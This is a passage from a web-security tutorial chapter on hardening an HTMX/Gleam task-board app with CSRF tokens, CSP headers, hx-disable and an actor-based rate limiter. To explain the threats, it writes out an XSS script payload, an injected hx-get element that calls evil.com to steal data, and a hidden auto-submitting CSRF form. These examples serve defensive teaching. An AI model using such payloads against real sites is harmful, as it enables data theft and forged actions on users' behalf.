# Chapter 14 -- Security Hardening

**Phase:** Advanced
**Project:** "Teamwork" -- a collaborative task board
**Previous:** [Chapter 13](13-real-time-with-sse.md) added real-time SSE. The app is feature-rich but needs security hardening.

---

## Learning Objectives

By the end of this chapter, you will:

- Understand the three most common web security threats -- XSS, CSRF, and injection -- and how each applies to an HTMX application
- Know how HTMX changes the security threat model compared to traditional multi-page apps and JavaScript SPAs
- Implement CSRF protection using a token-in-meta-tag pattern that HTMX sends automatically with every request
- Add `hx-confirm` to destructive actions so users get a confirmation dialog before deleting boards or tasks
- Set Content Security Policy (CSP) and other security headers in Gleam middleware
- Use `hx-disable` to prevent HTMX from processing user-generated content
- Build a simple rate limiting middleware using a Gleam actor

---

## Theory

Our Teamwork app now has boards, tasks, drag-and-drop reordering, and real-time
updates via SSE. It is feature-complete. But a feature-complete application that
is not secure is worse than no application at all -- it is an invitation.

Security does not have to be scary. Most of the protections we need are
straightforward, and Gleam's type system and Lustre's rendering model already
give us a head start. Let us walk through the threats one by one, understand
what HTMX changes about each, and then build the defenses.

---

### 1. XSS -- Cross-Site Scripting

XSS happens when an attacker manages to inject their own JavaScript into your
page. Once their script runs in a user's browser, it can steal cookies, redirect
to phishing sites, or make requests as the logged-in user.

There are three flavors:

| Type         | How it works                                                  |
|--------------|---------------------------------------------------------------|
| **Stored**   | Attacker saves malicious script in your database (e.g., a task title like `<script>alert('hacked')</script>`). Every user who views it runs the script. |
| **Reflected**| Attacker crafts a URL with a script in a query parameter. The server echoes it back into the HTML without escaping. |
| **DOM-based**| The client-side code (JavaScript) inserts untrusted data into the DOM without escaping. |

#### Why Lustre Protects Us (Mostly)

Lustre's `element.text()` function automatically escapes HTML entities. If a
user creates a task titled `<script>alert('xss')</script>`, Lustre renders it
as:

```html
&lt;script&gt;alert('xss')&lt;/script&gt;
```

The browser displays the text literally instead of executing it. This is not
something you have to remember to do -- it happens by default every time you use
`element.text()`. This single design decision eliminates the vast majority of
XSS vulnerabilities.

**The danger zone:** If you ever bypass Lustre and insert raw HTML strings
directly into the response (for example, by concatenating user input into an
HTML string), you lose this protection. The rule is simple: always use
`element.text()` for user-provided content, never string concatenation.

#### HTMX-Specific XSS Considerations

HTMX introduces a subtle new vector. Because HTMX processes `hx-*` attributes
on any element in the DOM, an attacker who can inject HTML (even without
`<script>` tags) could potentially inject elements like:

```html
<div hx-get="https://evil.com/steal-data" hx-trigger="load" hx-swap="none">
</div>
```

This would silently make a request to the attacker's server as soon as the
element appears on the page. No `<script>` tag needed.

The defense is `hx-disable`. When you place `hx-disable` on a container element,
HTMX will not process any `hx-*` attributes on that element or any of its
descendants. We will use this for all user-generated content.

---

### 2. CSRF -- Cross-Site Request Forgery

CSRF is an attack where a malicious website tricks a user's browser into making
an unwanted request to your application. Because the browser automatically
includes cookies with every request to your domain, the server cannot tell the
difference between a legitimate request and a forged one.

Here is the classic scenario:

```
1. Alice logs into Teamwork at teamwork.example.com.
   Her browser stores a session cookie.

2. Alice visits evil.com (maybe via a phishing email).

3. evil.com contains a hidden form:
   <form action="https://teamwork.example.com/boards/1" method="POST">
     <input type="hidden" name="action" value="delete">
   </form>
   <script>document.forms[0].submit()</script>

4. Alice's browser submits the form to teamwork.example.com,
   automatically including her session cookie.

5. The Teamwork server sees a valid session cookie and deletes the board.
   Alice never intended this.
```

#### CSRF and HTMX

Traditional CSRF protection relies on embedding a token in HTML forms. But HTMX
does not always use forms -- it makes AJAX requests from buttons, divs, and
other elements. The protection needs to work differently.

The standard HTMX pattern is:

1. **Store the CSRF token in a `<meta>` tag** in the page's `<head>`.
2. **Configure HTMX to read the meta tag** and include the token as a custom
   header (`X-CSRF-Token`) with every request.
3. **Validate the header on the server** for all state-changing requests (POST,
   PUT, PATCH, DELETE).

Why does this work? Because a cross-origin request from `evil.com` cannot read
meta tags from your page (same-origin policy) and cannot set custom headers on
cross-origin requests (CORS policy). The attacker can trigger a form submission,
but they cannot add a custom header with the correct token.

---

### 3. Content Security Policy (CSP)

CSP is an HTTP response header that tells the browser which resources are
allowed to load and execute. It is a defense-in-depth mechanism -- even if an
attacker manages to inject a `<script>` tag, CSP can prevent it from running.

A typical CSP header looks like this:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://unpkg.com; style-src 'self' 'unsafe-inline'
```

Reading it aloud:

- `default-src 'self'` -- By default, only load resources from our own domain.
- `script-src 'self' https://unpkg.com` -- Scripts can come from our domain or
  from unpkg.com (where we load HTMX).
- `style-src 'self' 'unsafe-inline'` -- Styles can come from our domain or be
  inline (we use inline styles in some components).

CSP is not a silver bullet, but it is a strong layer of defense. Combined with
Lustre's automatic escaping and HTMX's `hx-disable`, it makes a successful XSS
attack significantly harder.

---

### 4. `hx-confirm` -- Guarding Destructive Actions

The `hx-confirm` attribute shows a browser confirmation dialog before HTMX
sends the request. If the user clicks "Cancel", the request is never made.

```html
<button hx-delete="/boards/5"
        hx-confirm="Are you sure you want to delete this board? This cannot be undone.">
  Delete Board
</button>
```

This is not a security measure in the traditional sense -- a determined attacker
would not be stopped by a dialog. But it protects against the most common
"attack": the user's own accidental click. It is especially important for
operations that cannot be undone, like deleting a board or removing a team
member.

---

### 5. Rate Limiting

Rate limiting prevents abuse by restricting how many requests a client can make
in a given time window. Without it, an attacker could:

- Brute-force login attempts
- Flood the task creation endpoint to fill the database
- Overwhelm the SSE endpoint with connections
- Scrape all your data by rapidly hitting every endpoint

A simple approach is a sliding window counter per IP address. We will implement
this using a Gleam actor (an OTP `gen_server`) that tracks request counts in
memory.

---

### 6. Other Security Headers

Beyond CSP, several other HTTP headers harden your application:

| Header                      | Purpose                                              |
|-----------------------------|------------------------------------------------------|
| `X-Content-Type-Options: nosniff` | Prevents the browser from guessing the MIME type. Without this, a browser might interpret a text file as JavaScript. |
| `X-Frame-Options: DENY`    | Prevents your site from being loaded in an iframe, blocking clickjacking attacks. |
| `Referrer-Policy: strict-origin-when-cross-origin` | Controls how much referrer information is sent with requests to other sites. |

These are one-liners to add, and there is no reason to skip them.

---

## Code Walkthrough

Let us harden the Teamwork application step by step. We will build:

1. CSRF token generation and validation middleware
2. A layout that injects the CSRF meta tag and configures HTMX
3. Security headers middleware (CSP, X-Frame-Options, etc.)
4. `hx-confirm` on destructive actions
5. `hx-disable` on user-generated content
6. A rate limiting actor and middleware

### Project Structure

```
teamwork/
  src/
    teamwork.gleam            -- main entry point
    teamwork/router.gleam     -- route matching
    teamwork/middleware.gleam  -- security middleware (new)
    teamwork/rate_limiter.gleam -- rate limiting actor (new)
    teamwork/web.gleam        -- layout, components
  priv/
    static/
      styles.css
  gleam.toml
```

---

### Step 1: CSRF Token Generation

We need two functions: one to generate a random token and one to store it in a
signed cookie. Wisp provides `wisp.random_string` for cryptographically secure
random strings and `wisp.set_cookie` for signed cookies.

**`src/teamwork/middleware.gleam`** (beginning of the file)

```gleam
import gleam/http
import gleam/list
import gleam/result
import gleam/string
import wisp.{type Request, type Response}

/// Generate a new CSRF token -- a 32-character random string.
pub fn generate_csrf_token() -> String {
  wisp.random_string(32)
}

/// Read the CSRF token from the signed cookie on the request.
/// Returns Ok(token) if the cookie exists and is valid, Error(Nil) otherwise.
pub fn get_csrf_token(req: Request) -> Result(String, Nil) {
  wisp.get_cookie(req, "csrf_token", wisp.Signed)
}

/// Set the CSRF token as a signed cookie on the response.
pub fn set_csrf_cookie(resp: Response, req: Request, token: String) -> Response {
  wisp.set_cookie(resp, req, "csrf_token", token, wisp.Signed, 60 * 60)
}
```

The token is stored in a signed cookie, which means the browser sends it back
with every request but cannot tamper with it. Signing prevents an attacker from
forging a valid cookie value.

---

### Step 2: CSRF Validation Middleware

The middleware checks every state-changing request (POST, PUT, PATCH, DELETE)
for a valid CSRF token. It compares the token from the `X-CSRF-Token` header
(set by HTMX) against the token in the signed cookie.

```gleam
/// Middleware that validates CSRF tokens on state-changing requests.
/// GET, HEAD, and OPTIONS are safe methods and are allowed through.
/// All other methods must include an X-CSRF-Token header that matches
/// the token stored in the signed csrf_token cookie.
pub fn require_csrf(
  req: Request,
  handler: fn() -> Response,
) -> Response {
  case req.method {
    // Safe methods -- no CSRF check needed
    http.Get | http.Head | http.Options -> handler()

    // State-changing methods -- validate the token
    _ -> {
      let token_from_header =
        list.key_find(req.headers, "x-csrf-token")
      let token_from_cookie =
        wisp.get_cookie(req, "csrf_token", wisp.Signed)

      case token_from_header, token_from_cookie {
        Ok(header_value), Ok(cookie_value) if header_value == cookie_value ->
          handler()

        _, _ -> {
          wisp.log_warning("CSRF validation failed")
          wisp.response(403)
        }
      }
    }
  }
}
```

Let us trace through this logic:

```
Incoming POST /tasks/create
    │
    ├── Is it GET, HEAD, or OPTIONS?
    │     No -- it is POST.
    │
    ├── Read X-CSRF-Token header
    │     -> "a1b2c3d4..."
    │
    ├── Read csrf_token cookie (signed)
    │     -> "a1b2c3d4..."
    │
    ├── Do they match?
    │     Yes -> allow the request through
    │     No  -> return 403 Forbidden
    │
    └── (If either is missing -> return 403 Forbidden)
```

The `if header_value == cookie_value` guard is the critical comparison. Both
values must be present and identical. If either is missing (the `_, _` catch-all
pattern), the request is rejected with a 403.

---

### Step 3: Layout with CSRF Meta Tag

Now we need to inject the CSRF token into the page so HTMX can read it. We use
a `<meta>` tag in the `<head>` and a small script that configures HTMX to
include the token as a header with every request.

**`src/teamwork/web.gleam`**

```gleam
import hx
import lustre/attribute.{attribute}
import lustre/element.{type Element}
import lustre/element/html

/// Render the full page layout with CSRF protection baked in.
/// The csrf_token is embedded in a meta tag, and a script configures
/// HTMX to send it as a header with every request.
pub fn layout(
  title: String,
  csrf_token: String,
  content: Element(t),
) -> Element(t) {
  html.html([], [
    html.head([], [
      html.meta([attribute("charset", "utf-8")]),
      html.meta([
        attribute.name("viewport"),
        attribute("content", "width=device-width, initial-scale=1"),
      ]),
      html.title([], title),

      // Load HTMX from CDN
      html.script(
        [attribute.src("https://unpkg.com/htmx.org@2.0.8")],
        "",
      ),

      // Load the SSE extension (from Chapter 13)
      html.script(
        [attribute.src("https://unpkg.com/htmx-ext-sse@2.2.2/sse.js")],
        "",
      ),

      // CSRF meta tag -- HTMX reads this value
      html.meta([
        attribute.name("csrf-token"),
        attribute("content", csrf_token),
      ]),

      // Configure HTMX to include the CSRF token with every request
      html.script([], "
        document.addEventListener('DOMContentLoaded', function() {
          document.body.addEventListener('htmx:configRequest', function(event) {
            var meta = document.querySelector('meta[name=\"csrf-token\"]');
            if (meta) {
              event.detail.headers['X-CSRF-Token'] = meta.content;
            }
          });
        });
      "),

      // Stylesheet
      html.link([
        attribute.rel("stylesheet"),
        attribute.href("/static/styles.css"),
      ]),
    ]),
    html.body([hx.boost(True)], [content]),
  ])
}
```

Let us understand the JavaScript snippet. It is only six lines and it is the
only JavaScript we write in this entire application:

1. Wait for the DOM to be ready (`DOMContentLoaded`).
2. Listen for `htmx:configRequest` on the body. This event fires before every
   HTMX request, giving us a chance to modify headers.
3. Find the `<meta name="csrf-token">` tag and read its `content` attribute.
4. Add the token as an `X-CSRF-Token` header on the outgoing request.

Every HTMX request -- every `hx-get`, `hx-post`, `hx-delete` -- will now
automatically include the CSRF token. You do not need to add anything to
individual buttons or forms.

---

### Step 4: Security Headers Middleware

This middleware adds security headers to every response. It is a simple
function that takes a response and returns a new response with additional
headers.

**`src/teamwork/middleware.gleam`** (continued)

```gleam
/// Add security headers to a response.
/// Call this on every response in your middleware chain.
pub fn security_headers(resp: Response) -> Response {
  resp
  |> wisp.set_header(
    "Content-Security-Policy",
    string.join([
      "default-src 'self'",
      "script-src 'self' https://unpkg.com 'unsafe-inline'",
      "style-src 'self' 'unsafe-inline'",
      "connect-src 'self'",
      "img-src 'self' data:",
    ], "; "),
  )
  |> wisp.set_header("X-Content-Type-Options", "nosniff")
  |> wisp.set_header("X-Frame-Options", "DENY")
  |> wisp.set_header("Referrer-Policy", "strict-origin-when-cross-origin")
}
```

Let us break down the CSP directives:

| Directive        | Value                                    | Why                                          |
|------------------|------------------------------------------|----------------------------------------------|
| `default-src`    | `'self'`                                 | Only allow resources from our own origin by default. |
| `script-src`     | `'self' https://unpkg.com 'unsafe-inline'` | Allow scripts from our origin, from unpkg.com (HTMX and SSE extension), and inline scripts (our CSRF config script). |
| `style-src`      | `'self' 'unsafe-inline'`                 | Allow our stylesheet and inline styles used by some components. |
| `connect-src`    | `'self'`                                 | AJAX and SSE connections can only go to our own origin. This is critical -- it prevents HTMX from being hijacked to make requests to external servers. |
| `img-src`        | `'self' data:`                           | Images from our origin and data URIs (for small inline images). |

The `connect-src 'self'` directive is particularly important for HTMX apps. Even
if an attacker manages to inject an `hx-get="https://evil.com/..."` attribute,
the browser will block the request because it violates the CSP.

> **Note on `'unsafe-inline'` in `script-src`:** Ideally we would avoid
> `'unsafe-inline'` and use a nonce or hash instead. For this course, we keep it
> simple. In a production application, consider generating a per-request nonce
> and including it in both the CSP header and the `<script>` tag:
> `<script nonce="random123">...</script>`.

---

### Step 5: `hx-confirm` on Destructive Actions

Adding `hx-confirm` is straightforward. Let us create components for the delete
buttons on boards and tasks.

**`src/teamwork/web.gleam`** (continued)

```gleam
import lustre/attribute
import lustre/element.{type Element}
import lustre/element/html
import hx

/// A delete button for a board. Shows a confirmation dialog before
/// sending the DELETE request.
pub fn delete_board_button(board_id: String) -> Element(t) {
  html.button(
    [
      hx.delete("/boards/" <> board_id),
      hx.confirm(
        "Are you sure you want to delete this board? "
        <> "All tasks on this board will be permanently removed. "
        <> "This action cannot be undone.",
      ),
      hx.target(hx.Selector("#board-" <> board_id)),
      hx.swap(hx.OuterHTML),
      attribute.class("btn btn-danger"),
    ],
    [element.text("Delete Board")],
  )
}

/// A delete button for a task. Shorter confirmation message since
/// deleting a single task is less destructive.
pub fn delete_task_button(task_id: String) -> Element(t) {
  html.button(
    [
      hx.delete("/tasks/" <> task_id),
      hx.confirm("Delete this task?"),
      hx.target(hx.Selector("#task-" <> task_id)),
      hx.swap(hx.OuterHTML),
      attribute.class("btn btn-danger btn-sm"),
    ],
    [element.text("Delete")],
  )
}

/// A button to remove a user from a board.
pub fn remove_member_button(board_id: String, user_id: String) -> Element(t) {
  html.button(
    [
      hx.delete("/boards/" <> board_id <> "/members/" <> user_id),
      hx.confirm(
        "Remove this member from the board? "
        <> "They will lose access to all tasks.",
      ),
      hx.target(hx.Selector("#member-" <> user_id)),
      hx.swap(hx.OuterHTML),
      attribute.class("btn btn-danger btn-sm"),
    ],
    [element.text("Remove")],
  )
}
```

The interaction flow:

```
User clicks "Delete Board"
    │
    ▼
Browser shows: ┌─────────────────────────────────────────┐
               │ Are you sure you want to delete this    │
               │ board? All tasks on this board will be   │
               │ permanently removed. This action cannot  │
               │ be undone.                               │
               │                                          │
               │              [Cancel]  [OK]              │
               └─────────────────────────────────────────┘
    │                              │
    │ Cancel                       │ OK
    ▼                              ▼
Nothing happens.            HTMX sends: DELETE /boards/5
                            (with X-CSRF-Token header)
                                   │
                                   ▼
                            Server deletes the board
                            and returns empty 200.
                                   │
                                   ▼
                            HTMX removes #board-5
                            from the DOM (outerHTML swap
                            with empty response).
```

The confirmation message should be specific to the action. "Are you sure?" is
not helpful. "Delete this task?" is clear for a low-impact action. "Are you sure
you want to delete this board? All tasks will be permanently removed." is
appropriately alarming for a high-impact action.

---

### Step 6: Preventing HTMX Injection in User Content

Whenever you render user-generated content, wrap it in a container with
`hx-disable`. This tells HTMX to ignore any `hx-*` attributes inside that
container, even if the attacker managed to inject them.

```gleam
/// Render user-generated content safely.
/// The hx-disable attribute prevents HTMX from processing any
/// hx-* attributes that might be present in the content.
/// Lustre's element.text() already escapes HTML entities,
/// so this is a defense-in-depth measure.
pub fn user_content(text: String) -> Element(t) {
  html.div(
    [attribute.attribute("hx-disable", "")],
    [element.text(text)],
  )
}

/// Render a task card with user-provided title and description.
/// Both text fields are escaped by element.text() and wrapped
/// in an hx-disable container.
pub fn task_card(task: Task) -> Element(t) {
  html.div(
    [
      attribute.class("task-card"),
      attribute.id("task-" <> task.id),
    ],
    [
      // Title -- user content, rendered safely
      html.h3(
        [attribute.attribute("hx-disable", "")],
        [element.text(task.title)],
      ),

      // Description -- user content, rendered safely
      html.p(
        [attribute.attribute("hx-disable", "")],
        [element.text(task.description)],
      ),

      // Action buttons -- NOT user content, HTMX is allowed here
      html.div([attribute.class("task-actions")], [
        delete_task_button(task.id),
      ]),
    ],
  )
}
```

Notice the separation: user-generated text (`task.title`, `task.description`) is
inside `hx-disable` containers, while the action buttons (which we control) are
outside of them. This gives us two layers of protection:

1. **Lustre escapes the HTML** -- so `<div hx-get="...">` becomes literal text.
2. **`hx-disable` blocks HTMX processing** -- even if escaping somehow fails,
   HTMX will not act on any attributes inside the container.

---

### Step 7: Rate Limiting with an Actor

We use a Gleam actor (OTP gen_server) to track request counts per IP address.
The actor maintains a dictionary of IP addresses to request counts and
timestamps.

**`src/teamwork/rate_limiter.gleam`**

```gleam
import gleam/dict.{type Dict}
import gleam/erlang/process.{type Subject}
import gleam/otp/actor
import gleam/time/timestamp

/// The maximum number of requests allowed per window.
const max_requests = 60

/// The time window in seconds.
const window_seconds = 60

/// Messages the rate limiter actor can receive.
pub type Message {
  /// Check if a request from this IP is allowed.
  /// Replies with True if allowed, False if rate limited.
  CheckRate(ip: String, reply_to: Subject(Bool))
}

/// Internal state: a dictionary mapping IP addresses to
/// { request_count, window_start_timestamp }.
pub type State {
  State(counters: Dict(String, #(Int, Int)))
}

fn result_map_started(
  result: Result(actor.Started(a), actor.StartError),
) -> Result(a, actor.StartError) {
  case result {
    Ok(started) -> Ok(started.data)
    Error(err) -> Error(err)
  }
}

/// Start the rate limiter actor.
pub fn start() -> Result(Subject(Message), actor.StartError) {
  actor.new(State(counters: dict.new()))
  |> actor.on_message(handle_message)
  |> actor.start
  |> result_map_started
}

fn handle_message(state: State, message: Message) -> actor.Next(State, Message) {
  case message {
    CheckRate(ip, reply_to) -> {
      let #(now, _) =
        timestamp.to_unix_seconds_and_nanoseconds(timestamp.system_time())

      let #(allowed, new_counters) = case dict.get(state.counters, ip) {
        // No record for this IP -- first request in this window
        Error(Nil) -> {
          let new_counters = dict.insert(state.counters, ip, #(1, now))
          #(True, new_counters)
        }

        // Existing record -- check if we are still in the same window
        Ok(#(count, window_start)) -> {
          case now - window_start < window_seconds {
            // Still in the window -- check the count
            True -> {
              case count < max_requests {
                True -> {
                  let new_counters =
                    dict.insert(state.counters, ip, #(count + 1, window_start))
                  #(True, new_counters)
                }
                False -> {
                  // Rate limit exceeded
                  #(False, state.counters)
                }
              }
            }

            // Window has expired -- reset the counter
            False -> {
              let new_counters = dict.insert(state.counters, ip, #(1, now))
              #(True, new_counters)
            }
          }
        }
      }

      process.send(reply_to, allowed)
      actor.continue(State(counters: new_counters))
    }
  }
}
```

The actor uses a fixed-window approach: it tracks how many requests each IP has
made since the start of the current 60-second window. When the window expires,
the counter resets. This is not the most sophisticated rate limiting algorithm,
but it is simple to understand and effective for most applications.

Here is the flow:

```
Request from 192.168.1.42
    │
    ▼
Actor checks its dictionary:
    │
    ├── No entry for this IP?
    │     -> Create entry: { count: 1, window_start: now }
    │     -> Reply: allowed (True)
    │
    ├── Entry exists, window expired (now - window_start >= 60)?
    │     -> Reset entry: { count: 1, window_start: now }
    │     -> Reply: allowed (True)
    │
    ├── Entry exists, window active, count < 60?
    │     -> Increment: { count: count + 1, window_start: same }
    │     -> Reply: allowed (True)
    │
    └── Entry exists, window active, count >= 60?
          -> Do not increment
          -> Reply: rate limited (False)
```

---

### Step 8: Rate Limiting Middleware

Now we connect the rate limiter actor to the request pipeline.

**`src/teamwork/middleware.gleam`** (continued)

```gleam
import gleam/erlang/process.{type Subject}
import gleam/otp/actor
import teamwork/rate_limiter.{type Message, CheckRate}

/// Context passed through the middleware chain.
/// The rate_limiter field holds a reference to the rate limiter actor.
pub type Context {
  Context(rate_limiter: Subject(Message))
}

/// Extract the client IP address from the request.
/// In production behind a reverse proxy, you would read
/// the X-Forwarded-For header instead.
fn get_client_ip(req: Request) -> String {
  // Try X-Forwarded-For first (for apps behind a proxy)
  case list.key_find(req.headers, "x-forwarded-for") {
    Ok(ip) -> ip
    Error(Nil) -> {
      // Fall back to the peer address, or "unknown"
      case list.key_find(req.headers, "x-real-ip") {
        Ok(ip) -> ip
        Error(Nil) -> "unknown"
      }
    }
  }
}

/// Rate limiting middleware. Checks the rate limiter actor before
/// allowing the request through. Returns 429 Too Many Requests
/// if the client has exceeded the limit.
pub fn rate_limit(
  req: Request,
  ctx: Context,
  handler: fn() -> Response,
) -> Response {
  let ip = get_client_ip(req)

  // Ask the rate limiter actor if this request is allowed.
  // The 1000ms timeout prevents a hung actor from blocking requests.
  let allowed =
    actor.call(ctx.rate_limiter, 1000, CheckRate(ip, _))

  case allowed {
    True -> handler()
    False ->
      wisp.response(429)
      |> wisp.set_header("Retry-After", "60")
      |> wisp.string_body("Rate limit exceeded. Try again in 60 seconds.")
  }
}
```

The `429 Too Many Requests` status code tells the client (and HTMX) that the
request was rejected because of rate limiting. The `Retry-After: 60` header
tells the client how long to wait before trying again.

---

### Step 9: Putting It All Together

Here is how the middleware chain looks in the main request handler. Each layer
adds a security check, and the request only reaches the router if all checks
pass.

**`src/teamwork/router.gleam`**

```gleam
import gleam/http
import lustre/element
import teamwork/middleware.{type Context}
import teamwork/web
import wisp.{type Request, type Response}

pub fn handle_request(req: Request, ctx: Context) -> Response {
  // Layer 1: Serve static files (CSS, images)
  use req <- wisp.serve_static(req, under: "/static", from: "priv/static")

  // Layer 2: Rate limiting
  use <- middleware.rate_limit(req, ctx)

  // Layer 3: CSRF validation
  use <- middleware.require_csrf(req)

  // Layer 4: Ensure CSRF token exists (set cookie if missing)
  let #(csrf_token, resp_with_cookie) = ensure_csrf_token(req)

  // Layer 5: Route the request
  let resp = route(req, csrf_token)

  // Layer 6: Apply security headers to the response
  resp
  |> middleware.security_headers
  |> apply_csrf_cookie(req, resp_with_cookie)
}

/// Ensure a CSRF token exists. If the request has a csrf_token cookie,
/// use it. Otherwise, generate a new one.
fn ensure_csrf_token(req: Request) -> #(String, Result(String, Nil)) {
  case middleware.get_csrf_token(req) {
    Ok(token) -> #(token, Error(Nil))
    Error(Nil) -> {
      let token = middleware.generate_csrf_token()
      #(token, Ok(token))
    }
  }
}

/// If we generated a new CSRF token, set it as a cookie on the response.
fn apply_csrf_cookie(
  resp: Response,
  req: Request,
  maybe_token: Result(String, Nil),
) -> Response {
  case maybe_token {
    Ok(token) -> middleware.set_csrf_cookie(resp, req, token)
    Error(Nil) -> resp
  }
}

/// Route the request to the appropriate handler.
fn route(req: Request, csrf_token: String) -> Response {
  case wisp.path_segments(req) {
    // Home page
    [] -> {
      let content = web.home_page()
      let page = web.layout("Teamwork", csrf_token, content)
      let body = element.to_document_string(page)
      wisp.html_response(body, 200)
    }

    // Board routes
    ["boards", board_id] -> board_routes(req, board_id)

    // Task routes
    ["tasks", task_id] -> task_routes(req, task_id)

    // ... other routes ...

    _ -> wisp.not_found()
  }
}
```

The middleware chain runs in order for every request:

```
Incoming request
    │
    ▼
[1] Static files?  ──yes──> Serve file directly (skip everything else)
    │ no
    ▼
[2] Rate limit OK? ──no───> 429 Too Many Requests
    │ yes
    ▼
[3] CSRF valid?    ──no───> 403 Forbidden (only for POST/PUT/PATCH/DELETE)
    │ yes
    ▼
[4] Ensure token   ──────> Generate if missing, reuse if present
    │
    ▼
[5] Route request  ──────> Match path, call handler
    │
    ▼
[6] Add headers    ──────> CSP, X-Frame-Options, etc.
    │
    ▼
Response sent to client
```

---

### Step 10: Starting the Application

The main entry point starts the rate limiter actor and passes it into the
context.

**`src/teamwork.gleam`**

```gleam
import gleam/erlang/process
import mist
import teamwork/middleware.{Context}
import teamwork/rate_limiter
import teamwork/router
import wisp
import wisp/wisp_mist

pub fn main() {
  wisp.configure_logger()
  let secret_key_base = wisp.random_string(64)

  // Start the rate limiter actor
  let assert Ok(rate_limiter) = rate_limiter.start()

  // Create the context with the rate limiter reference
  let ctx = Context(rate_limiter: rate_limiter)

  // Start the HTTP server
  let assert Ok(_) =
    wisp_mist.handler(router.handle_request(_, ctx), secret_key_base)
    |> mist.new
    |> mist.port(8000)
    |> mist.start

  process.sleep_forever()
}
```

Notice how `router.handle_request(_, ctx)` partially applies the context. Wisp
expects a function `fn(Request) -> Response`, but our handler takes a context
too. The `_` placeholder creates a function that captures `ctx` and only takes
the request as an argument. This is a common Gleam pattern for dependency
injection.

---

## Full Code Listing

Below are the complete files for the security-related modules. The router,
web components, and other modules from previous chapters remain largely
unchanged except for the middleware integration shown in Step 9.

### `src/teamwork/middleware.gleam`

```gleam
import gleam/erlang/process.{type Subject}
import gleam/http
import gleam/list
import gleam/otp/actor
import gleam/result
import gleam/string
import teamwork/rate_limiter.{type Message, CheckRate}
import wisp.{type Request, type Response}

// ── Types ────────────────────────────────────────────────────────────────

/// Context passed through the middleware chain.
pub type Context {
  Context(rate_limiter: Subject(Message))
}

// ── CSRF ─────────────────────────────────────────────────────────────────

/// Generate a new CSRF token.
pub fn generate_csrf_token() -> String {
  wisp.random_string(32)
}

/// Read the CSRF token from the signed cookie.
pub fn get_csrf_token(req: Request) -> Result(String, Nil) {
  wisp.get_cookie(req, "csrf_token", wisp.Signed)
}

/// Set the CSRF token as a signed cookie (1 hour expiry).
pub fn set_csrf_cookie(resp: Response, req: Request, token: String) -> Response {
  wisp.set_cookie(resp, req, "csrf_token", token, wisp.Signed, 60 * 60)
}

/// Validate CSRF token on state-changing requests.
pub fn require_csrf(
  req: Request,
  handler: fn() -> Response,
) -> Response {
  case req.method {
    http.Get | http.Head | http.Options -> handler()

    _ -> {
      let token_from_header =
        list.key_find(req.headers, "x-csrf-token")
      let token_from_cookie =
        wisp.get_cookie(req, "csrf_token", wisp.Signed)

      case token_from_header, token_from_cookie {
        Ok(header_val), Ok(cookie_val) if header_val == cookie_val ->
          handler()

        _, _ -> {
          wisp.log_warning("CSRF validation failed")
          wisp.response(403)
        }
      }
    }
  }
}

// ── Security Headers ─────────────────────────────────────────────────────

/// Add security headers to every response.
pub fn security_headers(resp: Response) -> Response {
  resp
  |> wisp.set_header(
    "Content-Security-Policy",
    string.join(
      [
        "default-src 'self'",
        "script-src 'self' https://unpkg.com 'unsafe-inline'",
        "style-src 'self' 'unsafe-inline'",
        "connect-src 'self'",
        "img-src 'self' data:",
      ],
      "; ",
    ),
  )
  |> wisp.set_header("X-Content-Type-Options", "nosniff")
  |> wisp.set_header("X-Frame-Options", "DENY")
  |> wisp.set_header("Referrer-Policy", "strict-origin-when-cross-origin")
}

// ── Rate Limiting ────────────────────────────────────────────────────────

/// Extract the client IP address from the request headers.
fn get_client_ip(req: Request) -> String {
  case list.key_find(req.headers, "x-forwarded-for") {
    Ok(ip) -> ip
    Error(Nil) ->
      case list.key_find(req.headers, "x-real-ip") {
        Ok(ip) -> ip
        Error(Nil) -> "unknown"
      }
  }
}

/// Rate limiting middleware.
pub fn rate_limit(
  req: Request,
  ctx: Context,
  handler: fn() -> Response,
) -> Response {
  let ip = get_client_ip(req)
  let allowed =
    actor.call(ctx.rate_limiter, 1000, CheckRate(ip, _))

  case allowed {
    True -> handler()
    False ->
      wisp.response(429)
      |> wisp.set_header("Retry-After", "60")
  }
}
```

### `src/teamwork/rate_limiter.gleam`

```gleam
import gleam/dict.{type Dict}
import gleam/erlang/process.{type Subject}
import gleam/otp/actor
import gleam/time/timestamp

const max_requests = 60

const window_seconds = 60

pub type Message {
  CheckRate(ip: String, reply_to: Subject(Bool))
}

pub type State {
  State(counters: Dict(String, #(Int, Int)))
}

fn result_map_started(
  result: Result(actor.Started(a), actor.StartError),
) -> Result(a, actor.StartError) {
  case result {
    Ok(started) -> Ok(started.data)
    Error(err) -> Error(err)
  }
}

pub fn start() -> Result(Subject(Message), actor.StartError) {
  actor.new(State(counters: dict.new()))
  |> actor.on_message(handle_message)
  |> actor.start
  |> result_map_started
}

fn handle_message(
  state: State,
  message: Message,
) -> actor.Next(State, Message) {
  case message {
    CheckRate(ip, reply_to) -> {
      let #(now, _) =
        timestamp.to_unix_seconds_and_nanoseconds(timestamp.system_time())

      let #(allowed, new_counters) = case dict.get(state.counters, ip) {
        Error(Nil) -> {
          #(True, dict.insert(state.counters, ip, #(1, now)))
        }

        Ok(#(count, window_start)) -> {
          case now - window_start < window_seconds {
            True ->
              case count < max_requests {
                True -> {
                  let counters =
                    dict.insert(state.counters, ip, #(count + 1, window_start))
                  #(True, counters)
                }
                False -> #(False, state.counters)
              }

            False -> {
              #(True, dict.insert(state.counters, ip, #(1, now)))
            }
          }
        }
      }

      process.send(reply_to, allowed)
      actor.continue(State(counters: new_counters))
    }
  }
}
```

### `src/teamwork.gleam`

```gleam
import gleam/erlang/process
import mist
import teamwork/middleware.{Context}
import teamwork/rate_limiter
import teamwork/router
import wisp
import wisp/wisp_mist

pub fn main() {
  wisp.configure_logger()
  let secret_key_base = wisp.random_string(64)

  let assert Ok(limiter) = rate_limiter.start()
  let ctx = Context(rate_limiter: limiter)

  let assert Ok(_) =
    wisp_mist.handler(router.handle_request(_, ctx), secret_key_base)
    |> mist.new
    |> mist.port(8000)
    |> mist.start

  process.sleep_forever()
}
```

---

## Exercise

Time to put security into practice. Complete the following tasks to harden the
Teamwork application.

### Task 1: Add CSRF Protection to All Forms

Add CSRF protection to the entire application:

1. Generate a CSRF token and store it in a signed cookie when the user first
   visits the site.
2. Include the CSRF token in a `<meta>` tag in the page `<head>`.
3. Configure HTMX to send the token as an `X-CSRF-Token` header with every
   request.
4. Write middleware that validates the token on POST, PUT, PATCH, and DELETE
   requests and returns 403 if the token is missing or incorrect.

Verify: Open the browser's Network tab and make any state-changing action (create
